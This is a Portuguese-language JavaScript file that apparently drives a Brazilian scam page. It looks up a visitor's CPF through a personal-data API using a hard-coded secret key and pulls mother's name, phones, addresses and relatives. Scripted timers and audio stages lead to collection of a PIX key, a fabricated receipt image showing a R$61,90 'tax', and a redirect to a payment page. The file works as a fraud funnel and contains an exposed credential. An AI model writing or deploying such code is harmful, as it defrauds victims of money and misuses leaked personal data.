// ============================================================
// function.js — versão robusta (CPF + Comprovante)
// ============================================================

// ------------------------------------------------------------
// Helpers globais
// ------------------------------------------------------------
const _isHttp = (s) => typeof s === 'string' && /^https?:\/\//i.test(s);
const _isData = (s) => typeof s === 'string' && /^data:image\/[a-zA-Z+.-]+;base64,/i.test(s);

// Helper para verificar se elemento existe antes de usar classList
const _safeClassList = (element, action, ...classes) => {
  if (element && element.classList) {
    if (action === 'add') {
      element.classList.add(...classes);
    } else if (action === 'remove') {
      element.classList.remove(...classes);
    } else if (action === 'toggle') {
      element.classList.toggle(...classes);
    } else if (action === 'contains') {
      return element.classList.contains(...classes);
    }
    return true;
  }
  return false;
};

// Cache do comprovante por chave (cpf|name|data|tax)
let _comprovanteCache = { key: null, src: null };

// Log básico de erros não tratados (ajuda a depurar em produção)
window.addEventListener('error', (e) => {
  console.error('JS Error:', e.message, 'em', e.filename + ':' + e.lineno);
});
window.addEventListener('unhandledrejection', (e) => {
  console.error('Promise rejeitada sem catch:', e.reason);
});

// ------------------------------------------------------------
// Fetch com fallback para proxy (CORS) — tolerante a text/plain
// ------------------------------------------------------------
async function fetchJsonWithCorsFallback(url) {
  try {
    const r = await fetch(url, { 
      headers: { 'Accept': 'application/json, text/plain, */*' },
      mode: 'cors'
    });
    
    if (!r.ok) {
      throw new Error(`HTTP ${r.status}: ${r.statusText}`);
    }
    
    const text = await r.text();
    
    try {
      return JSON.parse(text);
    } catch (parseErr) {
      throw new Error(`Resposta não é um JSON válido: ${parseErr.message}`);
    }
  } catch (err) {
    try {
      const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(url);
      const r2 = await fetch(proxyUrl, { 
        headers: { 'Accept': 'application/json, text/plain, */*' },
        mode: 'cors'
      });
      
      if (!r2.ok) {
        throw new Error(`Proxy HTTP ${r2.status}: ${r2.statusText}`);
      }
      
      const txt = await r2.text();
      
      try {
        return JSON.parse(txt);
      } catch (e2) {
        throw new Error(`Proxy retornou resposta inválida: ${e2.message}`);
      }
    } catch (proxyErr) {
      throw new Error(`Falha tanto na requisição direta quanto no proxy: ${err.message} | ${proxyErr.message}`);
    }
  }
}

// ------------------------------------------------------------
// Fetch texto com fallback para proxy (CORS)
// ------------------------------------------------------------
async function fetchTextWithCorsFallback(url) {
  try {
    const r = await fetch(url, { headers: { 'Accept': 'text/html, text/plain, */*' }, mode: 'cors' });
    if (!r.ok) throw new Error(`HTTP ${r.status}: ${r.statusText}`);
    return await r.text();
  } catch (err) {
    try {
      const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(url);
      const r2 = await fetch(proxyUrl, { headers: { 'Accept': 'text/html, text/plain, */*' }, mode: 'cors' });
      if (!r2.ok) throw new Error(`Proxy HTTP ${r2.status}: ${r2.statusText}`);
      return await r2.text();
    } catch (proxyErr) {
      throw new Error(`Falha texto direto e via proxy: ${err.message} | ${proxyErr.message}`);
    }
  }
}

// ------------------------------------------------------------
// Extrai a imagem do HTML (<img src=...> ou data URI)
// ------------------------------------------------------------
function extractImageSrcFromHtml(html) {
  if (typeof html !== 'string') return null;
  // Tenta pegar src do primeiro <img>
  const imgMatch = html.match(/<img[^>]+src=["']([^"']+)["'][^>]*>/i);
  if (imgMatch && imgMatch[1]) {
    const s = imgMatch[1].trim();
    if (_isHttp(s) || _isData(s)) return s;
  }
  // Busca data URI diretamente
  const dataMatch = html.match(/data:image\/[a-zA-Z+.-]+;base64,[A-Za-z0-9+/=]+/);
  return dataMatch ? dataMatch[0] : null;
}

// ------------------------------------------------------------
// Extrai a imagem do JSON (aceita http(s) e data URI)
// ------------------------------------------------------------
function extractImageSrcFromJson(json) {
  if (!json || typeof json !== 'object') return null;

  const paths = [
    ['data', 'image'],
    ['image'],
    ['url'],
    ['link'],
    ['data', 'url'],
    ['data', 'link'],
  ];

  for (const p of paths) {
    let v = json;
    for (const k of p) v = v?.[k];
    if (typeof v === 'string') {
      const s = v.trim();
      if (_isHttp(s) || _isData(s)) return s;
    }
  }

  // fallback: procura http(s)
  const str = JSON.stringify(json);
  const mHttp = str.match(/https?:\/\/[^"']+\.(?:png|jpe?g|webp|gif)/i);
  if (mHttp) return mHttp[0];

  // fallback: procura data URI
  const mData = str.match(/data:image\/[a-zA-Z+.-]+;base64,[A-Za-z0-9+/=]+/);
  return mData ? mData[0] : null;
}

// ------------------------------------------------------------
// Gera/obtém a imagem do comprovante (com cache por chave)
// ------------------------------------------------------------
async function prefetchComprovante() {
  const cpf = (localStorage.getItem('cpf') || '').replace(/\D/g, '');
  const name = localStorage.getItem('name') || '';
  
  // Formata data no formato DD/MM/AAAA (ano com 4 dígitos)
  const hoje = new Date();
  const dia = String(hoje.getDate()).padStart(2, '0');
  const mes = String(hoje.getMonth() + 1).padStart(2, '0');
  const ano = String(hoje.getFullYear()); // Ano completo com 4 dígitos
  const dataHoje = `${dia}/${mes}/${ano}`;

  const cacheKey = `${cpf}|${name}|${dataHoje}`;
  if (_comprovanteCache.key === cacheKey && _comprovanteCache.src) {
    console.log('[Comprovante] 📦 Usando cache');
    return _comprovanteCache.src;
  }

  // Formata CPF com pontos e hífen para exibição
  const cpfFormatado = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');

  // Monta URL base sem format para compatibilidade ampla
  const baseParams = new URLSearchParams({ 
    nome: name, 
    cpf: cpfFormatado, 
    data: dataHoje, 
    imposto: '61,90'
  });
  const baseEndpoint = `https://usuarioconsulta.store/acesso/assets/comprovante/index.php?${baseParams.toString()}`;
  const jsonEndpoint = baseEndpoint + '&format=json';
  console.log('[Comprovante] 🔗 URL base:', baseEndpoint);

  let src = null;

  // 1) Tenta JSON (via CORS + proxy fallback)
  try {
    const json = await fetchJsonWithCorsFallback(jsonEndpoint);
    console.log('[Comprovante] 📦 Resposta JSON:', json);
    src = json?.image || json?.data?.image || null;
  } catch (e) {
    console.warn('[Comprovante] JSON indisponível, tentando HTML:', e?.message || e);
  }

  // 2) Fallback: tenta extrair do HTML (a API retorna <img src="data:">)
  if (!src) {
    try {
      const html = await fetchTextWithCorsFallback(baseEndpoint);
      src = extractImageSrcFromHtml(html);
      console.log('[Comprovante] 🧩 Extraído do HTML:', !!src);
    } catch (e) {
      console.warn('[Comprovante] Falha ao obter HTML:', e?.message || e);
    }
  }

  if (!src) {
    throw new Error('Não foi possível obter o comprovante (JSON e HTML falharam)');
  }

  console.log('[Comprovante] ✅ Imagem pronta (tamanho aprox.):', typeof src === 'string' ? src.length : 'n/d');
  _comprovanteCache = { key: cacheKey, src };
  return src;
}

// ------------------------------------------------------------
// Mostra a imagem no Step 2 (cria elementos se não existirem)
// ------------------------------------------------------------
async function showComprovante() {
  try {
    console.log('🖼️ Iniciando carregamento do comprovante...');
    
    // 1) contêiner preferencial (procura no step2 que é onde está o comprovante no finalizacao.html)
    const root = document.getElementById('step14') || document.getElementById('step2') || document.body;
    const container =
      root.querySelector('[data-comprovante-container]') ||
      root.querySelector('.relative') ||
      root;
    
    console.log('📦 Container encontrado:', container.id || 'body');

    // 2) garante skeleton
    let skeleton = document.getElementById('comprovanteSkeleton');
    if (!skeleton) {
      skeleton = document.createElement('div');
      skeleton.id = 'comprovanteSkeleton';
      skeleton.className = 'w-full h-64 bg-gray-200 animate-pulse rounded-xl';
      container.appendChild(skeleton);
    }
    skeleton.classList.remove('hidden');

    // 3) garante img
    let img = document.getElementById('comprovanteImg');
    if (!img) {
      img = document.createElement('img');
      img.id = 'comprovanteImg';
      img.className = 'hidden w-full h-auto rounded-lg shadow-sm';
      img.alt = 'Gerando comprovante...';
      container.appendChild(img);
    }
    img.classList.add('hidden');
    img.removeAttribute('src');

    // 4) busca/gera URL
    console.log('🔄 Buscando comprovante da API...');
    const src = await prefetchComprovante();
    console.log('✅ URL do comprovante:', src);

    // 5) define src direto (sem validação prévia que estava causando erro)
    img.src = src;
    img.alt = 'Comprovante gerado';
    img.loading = 'eager';
    
    // 6) Aguarda o carregamento ou usa timeout
    const loadPromise = new Promise((resolve) => {
      img.onload = () => {
        console.log('✅ Imagem carregada com sucesso');
        resolve(true);
      };
      img.onerror = (err) => {
        console.warn('⚠️ Erro ao carregar, mas exibindo mesmo assim:', err);
        resolve(false);
      };
      
      // Timeout de 10 segundos
      setTimeout(() => {
        console.warn('⚠️ Timeout ao carregar, mas exibindo mesmo assim');
        resolve(false);
      }, 10000);
    });

    await loadPromise;

    // 7) mostra a imagem de qualquer forma
    console.log('🎉 Exibindo comprovante na tela');
    img.classList.remove('hidden');
    skeleton.classList.add('hidden');
  } catch (e) {
    console.error('❌ Erro ao carregar comprovante:', e);
    const img = document.getElementById('comprovanteImg');
    const skeleton = document.getElementById('comprovanteSkeleton');
    
    // Mesmo com erro, tenta exibir a imagem
    if (img && img.src) {
      console.log('⚠️ Exibindo imagem mesmo com erro');
      img.alt = 'Comprovante (pode estar carregando...)';
      img.classList.remove('hidden');
    }
    if (skeleton) {
      skeleton.classList.add('hidden');
    }
  }
}

// ============================================================
// Fluxo principal (form + timer)
// ============================================================
document.addEventListener('DOMContentLoaded', function () {
  const form = document.querySelector('form');
  const cpfInput = document.getElementById('cpf');
  const step1 = document.getElementById('step1');
  const step2 = document.getElementById('step2');

  // Formata CPF
  cpfInput.addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 11) value = value.slice(0, 11);
    if (value.length > 9) {
      value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
    } else if (value.length > 6) {
      value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, '$1.$2.$3');
    } else if (value.length > 3) {
      value = value.replace(/^(\d{3})(\d{3}).*/, '$1.$2');
    }
    e.target.value = value;
  });

  // Submit (usando nova API mytrust.space)
  form.addEventListener('submit', async function (e) {
    e.preventDefault();

    const cpf = cpfInput.value.replace(/\D/g, '');
    if (cpf.length !== 11) {
      alert('Por favor, digite um CPF válido');
      return;
    }

    const submitButton = form.querySelector('button[type="submit"]');
    const originalButtonText = submitButton.innerHTML;
    submitButton.innerHTML = '<div class="loader" style="display:inline-block;"></div> Consultando...';
    submitButton.disabled = true;

    try {
      const url = `https://api.mytrust.space/v1/cpf/${cpf}`;
      console.log('🔍 Consultando CPF:', cpf);
      
      const response = await fetch(url, {
        method: 'GET',
        headers: {
          'x-trust-key': 'sk_01jmww3qt6rcv30s1bjpydr5w801jmww3qt6hphhfyq19ws2trya',
          'Accept': 'application/json'
        }
      });

      console.log('📡 Status da resposta:', response.status);

      if (!response.ok) {
        const errorText = await response.text();
        console.error('❌ Erro HTTP:', response.status, errorText);
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }

      const result = await response.json();
      console.log('📦 Resposta completa da API:', result);

      if (!result) {
        console.error('❌ Resultado vazio');
        alert('Erro: A API retornou uma resposta vazia. Tente novamente.');
        return;
      }

      // A API pode retornar em formatos diferentes
      let apiData;
      
      // Formato 1: {statusCode: 200, data: {data: {...}}}
      if (result.statusCode === 200 && result.data?.data) {
        apiData = result.data.data;
      }
      // Formato 2: {data: {DADOS_PESSOAIS: {...}}}
      else if (result.data?.DADOS_PESSOAIS) {
        apiData = result.data;
      }
      // Formato 3: diretamente {DADOS_PESSOAIS: {...}}
      else if (result.DADOS_PESSOAIS) {
        apiData = result;
      }
      else {
        console.error('❌ Estrutura de dados não reconhecida:', result);
        alert('Erro: Estrutura de resposta inválida. Tente novamente.');
        return;
      }

      console.log('✅ Dados extraídos:', apiData);

      if (!apiData.DADOS_PESSOAIS) {
        alert('CPF não encontrado na base de dados ou estrutura de resposta inválida.');
        return;
      }

      // Adapta os dados para o formato esperado pelo sistema
      const userData = {
        dadosBasicos: {
          cpf: apiData.DADOS_PESSOAIS.CPF || cpf,
          nome: apiData.DADOS_PESSOAIS.NOME || apiData.DADOS_PESSOAIS.PRIMEIRO_NOME || '',
          nascimento: apiData.DADOS_PESSOAIS.DATA_NASCIMENTO || '',
          mae: apiData.DADOS_PESSOAIS.NOME_MAE || '',
          pai: apiData.DADOS_PESSOAIS.NOME_PAI || '',
          sexo: apiData.DADOS_PESSOAIS.SEXO || '',
          renda: apiData.DADOS_PESSOAIS.RENDA || '',
          rg: apiData.DADOS_PESSOAIS.RG || ''
        },
        telefones: apiData.TELEFONES || [],
        enderecos: apiData.ENDERECOS || [],
        parentes: apiData.PARENTES || []
      };

      localStorage.setItem('dadosBasicos', JSON.stringify(userData));
      localStorage.setItem('cpf', String(userData.dadosBasicos.cpf || cpf).replace(/\D/g, ''));
      localStorage.setItem('name', userData.dadosBasicos.nome || '');
      localStorage.setItem('nasc', userData.dadosBasicos.nascimento || '');
      localStorage.setItem('name_m', userData.dadosBasicos.mae || '');

      // Verificar se os elementos step existem antes de tentar usá-los
      _safeClassList(step1, 'add', 'hidden');
      _safeClassList(step2, 'remove', 'hidden');

      // Verificar se os elementos de nome existem antes de tentar usá-los
      const nameUser = document.getElementById('nameUser');
      const nameUser2 = document.getElementById('nameUser2');
      const nameValue = localStorage.getItem('name') || '';
      
      if (nameUser) {
        nameUser.textContent = nameValue;
      }
      if (nameUser2) {
        nameUser2.textContent = nameValue;
      }

      // Verificar se o elemento cpfUser existe antes de tentar usá-lo
      const cpfUser = document.getElementById('cpfUser');
      const cpfValue = localStorage.getItem('cpf') || cpf;
      
      if (cpfUser) {
        cpfUser.textContent = cpfValue;
      }

      // Só chamar handleTimer se estivermos em uma página que tem os elementos necessários
      if (step2) {
        handleTimer();
      } else {
        // Se não há step2, provavelmente estamos na página inicial
        // Redirecionar para a próxima página ou mostrar sucesso
        //alert('CPF consultado com sucesso! Redirecionando...');
        
        // Aqui você pode redirecionar para a próxima página
        window.location.href = 'video.html';
      }
    } catch (error) {
      let errorMessage = 'Erro ao consultar o CPF. ';
      if (error.message && error.message.includes('HTTP')) {
        errorMessage += 'Erro de conexão com o servidor.';
      } else if (error.message && error.message.includes('JSON')) {
        errorMessage += 'Resposta inválida do servidor.';
      } else if (error.message && error.message.includes('Proxy')) {
        errorMessage += 'Problema com o proxy de CORS.';
      } else if (error.message && error.message.includes('Failed to fetch')) {
        errorMessage += 'Erro de rede - verifique sua conexão.';
      } else if (error.message && error.message.includes('CORS')) {
        errorMessage += 'Erro de CORS - tentando proxy alternativo.';
      } else {
        errorMessage += `Erro: ${error.message || error.toString()}`;
      }
      
      alert(errorMessage);
    } finally {
      submitButton.innerHTML = originalButtonText;
      submitButton.disabled = false;
    }
  });

  function handleTimer() {
    const nameValue = localStorage.getItem('name');
    const nameHeaderEl = document.getElementById('nameHeader');
    if (nameHeaderEl) nameHeaderEl.textContent = nameValue || '';

    let totalSeconds = 100;
    const timerElement = document.getElementById('timer');
    const buttonElement = document.getElementById('buttonNext');

    const countdown = setInterval(() => {
      const minutes = Math.floor(totalSeconds / 60);
      const seconds = totalSeconds % 60;
      if (timerElement) {
        timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
      }
      totalSeconds--;
      if (totalSeconds < 0) {
        clearInterval(countdown);
        if (timerElement) timerElement.textContent = '00:00';
        buttonElement?.classList?.remove('hidden');
      }
    }, 1000);
  }
});

// ============================================================
// Controles de vídeo
// ============================================================
function playVideo1() {
  const video = document.getElementById('video1');
  const overlay = document.getElementById('overlay');
  video?.play();
  overlay?.classList?.add('hidden');
}
function playVideo2() {
  const video = document.getElementById('video2');
  const overlay = document.getElementById('overlay2');
  video?.play();
  overlay?.classList?.add('hidden');
}

// ============================================================
// Steps
// ============================================================
function step2to3() {
  const step2 = document.getElementById('step2');
  const step3 = document.getElementById('step3');
  step2.classList.add('hidden');
  step3.classList.remove('hidden');

  const v1 = document.getElementById('video1');
  if (v1) { try { v1.pause(); v1.muted = true; v1.currentTime = 0; } catch (_) {} }

  const nameValue = localStorage.getItem('name') || '';
  document.getElementById('nameUser2').textContent = nameValue;

  const cpfValue = localStorage.getItem('cpf') || '';
  document.getElementById('cpfUser').textContent = cpfValue;

  let tempoRestante = 45 * 60;
  function timer2() {
    const minutos = Math.floor(tempoRestante / 60);
    const segundos = tempoRestante % 60;
    const el = document.getElementById('timer2');
    if (el) el.textContent = `${String(minutos).padStart(2, '0')}:${String(segundos).padStart(2, '0')}`;
    if (tempoRestante > 0) tempoRestante--; else {
      clearInterval(intervalo);
      if (el) el.textContent = '00:00:00';
    }
  }
  const intervalo = setInterval(timer2, 1000);
}

function step3to4() {
  const step3 = document.getElementById('step3');
  const step4 = document.getElementById('step4');
  step3.classList.add('hidden');
  step4.classList.remove('hidden');
  setTimeout(() => { document.getElementById('button4')?.classList?.remove('hidden'); }, 38000);
}

function step4to5() {
  const step4 = document.getElementById('step4');
  const step5 = document.getElementById('step5');
  step4.classList.add('hidden');
  step5.classList.remove('hidden');

  const nameValue = localStorage.getItem('name') || '';
  document.getElementById('nameUser5').textContent = nameValue;

  const cpfValue = localStorage.getItem('cpf') || '';
  document.getElementById('cpfUser5').textContent = cpfValue;

  const nameM = localStorage.getItem('name_m') || '';
  document.getElementById('nameM5').textContent = nameM;

  const buttons = document.querySelectorAll('.option-btn');
  buttons.forEach((btn) => {
    btn.addEventListener('click', () => {
      if (btn.classList.contains('border-blue-500')) {
        btn.classList.remove('border-blue-500', 'bg-blue-100');
        btn.classList.add('border-gray-200');
      } else {
        buttons.forEach((b) => { b.classList.remove('border-blue-500', 'bg-blue-100'); b.classList.add('border-gray-200'); });
        btn.classList.remove('border-gray-200');
        btn.classList.add('border-blue-500', 'bg-blue-100');
      }
    });
  });
}

function step5to6() {
  const step5 = document.getElementById('step5');
  const step6 = document.getElementById('step6');
  step5.classList.add('hidden');
  step6.classList.remove('hidden');

  progressAudio1();
  function progressAudio1() {
    const audio = document.getElementById('audio1');
    audio?.play();
    const progressBarAudio1 = document.getElementById('progress-bar-audio1');
    let progress = 0;
    const duration = 8000, intervalTime = 60, increment = 100 / (duration / intervalTime);
    const interval = setInterval(() => {
      progress += increment;
      if (progress >= 100) { progress = 100; clearInterval(interval); }
      if (progressBarAudio1) progressBarAudio1.style.width = `${progress}%`;
    }, intervalTime);

    const actualTime = document.getElementById('actualTime');
    let secondsBy = 0, fullduration = 8;
    const timeInterval = setInterval(() => {
      if (secondsBy >= fullduration) { clearInterval(timeInterval); return; }
      secondsBy++;
      const minutesTime = Math.floor(secondsBy / 60);
      const secondsTime = secondsBy % 60;
      if (actualTime) actualTime.textContent = `${String(minutesTime).padStart(1,'0')}:${String(secondsTime).padStart(2,'0')}`;
    }, 1000);
  }

  setTimeout(() => { step6to7(); }, 10000);

  function step6to7() {
    const step6 = document.getElementById('step6');
    const step7 = document.getElementById('step7');
    step6.classList.add('hidden');
    step7.classList.remove('hidden');

    const progressBar = document.getElementById('progress-bar');
    const percentText = document.getElementById('percent');

    (function progress() {
      let progress = 0;
      const duration = 6000, intervalTime = 60, increment = 100 / (duration / intervalTime);
      const interval = setInterval(() => {
        progress += increment;
        if (progress >= 100) { progress = 100; clearInterval(interval); }
        if (progressBar) progressBar.style.width = `${progress}%`;
        if (percentText) percentText.textContent = `${Math.floor(progress)}%`;
      }, intervalTime);
    })();

    setTimeout(() => { step7to8(); }, 7000);

    function step7to8() {
      const step7 = document.getElementById('step7');
      const step8 = document.getElementById('step8');
      step7.classList.add('hidden');
      step8.classList.remove('hidden');

      setTimeout(() => { step8to9(); }, 5000);

      function step8to9() {
        const step8 = document.getElementById('step8');
        const step9 = document.getElementById('step9');
        step8.classList.add('hidden');
        step9.classList.remove('hidden');

        const nameValue = localStorage.getItem('name') || '';
        document.getElementById('nameUser9').textContent = nameValue;

        const cpfValue = localStorage.getItem('cpf') || '';
        document.getElementById('cpfUser9').textContent = cpfValue;

        const buttons = document.querySelectorAll('.pix-btn');
        const input = document.getElementById('pixKey');

        buttons.forEach((btn) => {
          btn.addEventListener('click', () => {
            if (input) {
              input.placeholder = btn.dataset.placeholder;
              input.type = btn.dataset.type;
            }
            buttons.forEach((b) => b.classList.remove('border-green-500','bg-green-50','text-green-800'));
            btn.classList.add('border-green-500','bg-green-50','text-green-800');
          });
        });
      }
    }
  }
}

function step9to10() {
  const step9 = document.getElementById('step9');
  const step10 = document.getElementById('step10');
  step9.classList.add('hidden');
  step10.classList.remove('hidden');

  const buttons = document.querySelectorAll('.pix-btn');
  const input = document.getElementById('pixKey');

  buttons.forEach((btn) => {
    btn.addEventListener('click', () => {
      if (input) {
        input.placeholder = btn.dataset.placeholder;
        input.type = btn.dataset.type;
      }
      buttons.forEach((b) => b.classList.remove('border-green-500','bg-green-50','text-green-800'));
      btn.classList.add('border-green-500','bg-green-50','text-green-800');
    });
  });

  const pixValue = input?.value || '';
  const tipoSelecionado = document.querySelector('.border-green-500');
  const tipo = tipoSelecionado?.textContent?.trim() || 'Desconhecido';

  if (pixValue === '') {
    alert('Por favor, insira uma chave PIX.');
    return;
  }

  localStorage.setItem('chavePix', pixValue);
  localStorage.setItem('tipoPIX', tipo);

  const nameValue = localStorage.getItem('name') || '';
  document.getElementById('nameUser10').textContent = nameValue;

  const cpfValue = localStorage.getItem('cpf') || '';
  document.getElementById('cpfUser10').textContent = cpfValue;

  const chavePix = localStorage.getItem('chavePix') || '';
  document.getElementById('chavePix10').textContent = chavePix;
}

function step10to11() {
  const step10 = document.getElementById('step10');
  const step11 = document.getElementById('step11');
  step10.classList.add('hidden');
  step11.classList.remove('hidden');

  const nameValue = localStorage.getItem('name') || '';
  document.getElementById('nameUser11').textContent = nameValue;

  const chavePix = localStorage.getItem('chavePix') || '';
  document.getElementById('chavePix11').textContent = chavePix;
}

function step10to9() {
  const step10 = document.getElementById('step10');
  const step9 = document.getElementById('step9');
  step10.classList.add('hidden');
  step9.classList.remove('hidden');
}

function step11to12() {
  const step11 = document.getElementById('step11');
  const step12 = document.getElementById('step12');
  step11.classList.add('hidden');
  step12.classList.remove('hidden');

  // pré-carrega comprovante durante o áudio
  prefetchComprovante().catch(() => {
    // Falha silenciosa, tentará novamente no step14
  });

  progressAudio2();
  function progressAudio2() {
    const audio = document.getElementById('audio2');
    audio?.play();
    const progressBarAudio2 = document.getElementById('progress-bar-audio2');
    let progress = 0;
    const duration = 19000, intervalTime = 60, increment = 100 / (duration / intervalTime);
    const interval = setInterval(() => {
      progress += increment;
      if (progress >= 100) { progress = 100; clearInterval(interval); }
      if (progressBarAudio2) progressBarAudio2.style.width = `${progress}%`;
    }, intervalTime);

    const actualTime2 = document.getElementById('actualTime2');
    let secondsBy2 = 0, fullduration2 = 19;
    const timeInterval2 = setInterval(() => {
      if (secondsBy2 >= fullduration2) { clearInterval(timeInterval2); return; }
      secondsBy2++;
      const minutesTime2 = Math.floor(secondsBy2 / 60);
      const secondsTime2 = secondsBy2 % 60;
      if (actualTime2) actualTime2.textContent = `${String(minutesTime2).padStart(1,'0')}:${String(secondsTime2).padStart(2,'0')}`;
    }, 1000);
  }

  setTimeout(() => { step12to13(); }, 20000);
}

function step12to13() {
  const step12 = document.getElementById('step12');
  const step13 = document.getElementById('step13');
  step12.classList.add('hidden');
  step13.classList.remove('hidden');

  (function progress2() {
    const progressBar2 = document.getElementById('progress-bar2');
    const percentText = document.getElementById('percent2');
    let progress2 = 0;
    const duration = 6000, intervalTime = 60, increment = 100 / (duration / intervalTime);
    const interval = setInterval(() => {
      progress2 += increment;
      if (progress2 >= 100) { progress2 = 100; clearInterval(interval); }
      if (progressBar2) progressBar2.style.width = `${progress2}%`;
      if (percentText) percentText.textContent = `${Math.floor(progress2)}%`;
    }, intervalTime);
  })();

  setTimeout(() => { step13to14(); }, 7000);
}

// Step 13 -> 14
function step13to14() {
  const step13 = document.getElementById('step13');
  const step14 = document.getElementById('step14');
  step13.classList.add('hidden');
  step14.classList.remove('hidden');

  const nameValue = localStorage.getItem('name') || '';
  document.getElementById('nameUser14').textContent = nameValue;

  const cpfValue = localStorage.getItem('cpf') || '';
  document.getElementById('cpfUser14').textContent = cpfValue;

  const chavePix = localStorage.getItem('chavePix') || '';
  document.getElementById('chavePix14').textContent = chavePix;

  const tipoPix = localStorage.getItem('tipoPIX') || '';
  document.getElementById('tipoPix14').textContent = tipoPix;

  // exibe a imagem do comprovante (chama 2x como failsafe)
  showComprovante();
  setTimeout(showComprovante, 1000);
}

function step14to15() {
  const step14 = document.getElementById('step14');
  const step15 = document.getElementById('step15');
  step14.classList.add('hidden');
  step15.classList.remove('hidden');

  progressAudio3();
  function progressAudio3() {
    const audio = document.getElementById('audio3');
    audio?.play();
    const progressBarAudio3 = document.getElementById('progress-bar-audio3');
    let progress = 0;
    const duration = 28000, intervalTime = 60, increment = 100 / (duration / intervalTime);
    const interval = setInterval(() => {
      progress += increment;
      if (progress >= 100) { progress = 100; clearInterval(interval); }
      if (progressBarAudio3) progressBarAudio3.style.width = `${progress}%`;
    }, intervalTime);

    const actualTime3 = document.getElementById('actualTime3');
    let secondsBy3 = 0, fullduration3 = 28;
    const timeInterval2 = setInterval(() => {
      if (secondsBy3 >= fullduration3) { clearInterval(timeInterval2); return; }
      secondsBy3++;
      const minutesTime3 = Math.floor(secondsBy3 / 60);
      const secondsTime3 = secondsBy3 % 60;
      if (actualTime3) actualTime3.textContent = `${String(minutesTime3).padStart(1,'0')}:${String(secondsTime3).padStart(2,'0')}`;
    }, 1000);
  }

  setTimeout(() => { step15to16(); }, 30000);
}

function step15to16() {
  const step15 = document.getElementById('step15');
  const step16 = document.getElementById('step16');
  step15.classList.add('hidden');
  step16.classList.remove('hidden');
}

// ============================================================
// URL final
// ============================================================
function redirect() {
  const cpf = localStorage.getItem('cpf') || '';
  const name = localStorage.getItem('name') || '';

  // URL de destino base
  const target = new URL('https://pay.atendimentoremoto.co/zj6aGnARw2YZwlK');

  // pega todos os parâmetros da URL atual e copia para o destino
  const currentParams = new URLSearchParams(window.location.search);
  currentParams.forEach((value, key) => {
    target.searchParams.append(key, value);
  });

  // adiciona/ sobrescreve document e name com valores do localStorage (se houver)
  if (cpf) target.searchParams.set('document', cpf);
  if (name) target.searchParams.set('name', name);

  // redireciona
  window.location.href = target.toString();
}

